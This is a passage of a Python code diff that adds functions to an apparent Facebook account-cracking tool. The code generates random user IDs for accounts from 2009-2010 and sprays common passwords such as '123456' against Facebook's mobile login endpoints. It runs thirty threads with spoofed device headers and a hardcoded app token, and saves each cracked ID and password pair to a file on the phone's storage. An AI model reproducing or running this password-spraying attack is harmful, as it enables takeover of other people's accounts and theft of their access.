+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        linex()
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
+
+
+def old_Tree():
+    """
+    Cloning method for accounts from 2009-2010.
+    """
+    user = []
+    ____banner____()
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
+    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    linex()
+    ____banner____()
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
+    linex()
+    prefix = '1000004'
+    for _ in range(int(limit)):
+        suffix = ''.join(random.choices('0123456789', k=8))
+        uid = prefix + suffix
+        user.append(uid)
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
+    linex()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        linex()
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
+
+
+def login_1(uid):
+    """
+    Login attempt method 1.
+    """
+    global loop
+    session = requests.session()
+    try:
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.flush()
+        for pw in ('123456', '1234567', '12345678', '123456789'):
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            headers = {
+                'User-Agent': window1(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': '25227',
+                'X-FB-SIM-HNI': '29752',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+            }
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            if 'session_key' in res:
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/A H B-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/A H B-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+        loop += 1
+    except Exception:
+        time.sleep(5)
+
+
+def login_2(uid):
+    """
+    Login attempt method 2.
+    """
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    
+    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
+        try:
+            with requests.Session() as session:
+                headers = {
+                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
+                    'x-fb-sim-hni': str(rr(20000, 40000)),
+                    'x-fb-net-hni': str(rr(20000, 40000)),
+                    'x-fb-connection-quality': 'EXCELLENT',
+                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+                    'user-agent': window1(),
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'x-fb-http-engine': 'Liger'
+                }
+                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+                po = session.get(url, headers=headers).json()
+                if 'session_key' in str(po):
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/A H B-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    oks.append(uid)
+                    break
+                elif 'session_key' in po:
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/A H B-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    oks.append(uid)
+                    break
+        except Exception as e:
+            pass
+    loop += 1
 
 if __name__ == '__main__':
-    anti_tamper()
-    security_check()
-    if key_system():
-        menu()
+    BNG_71_()
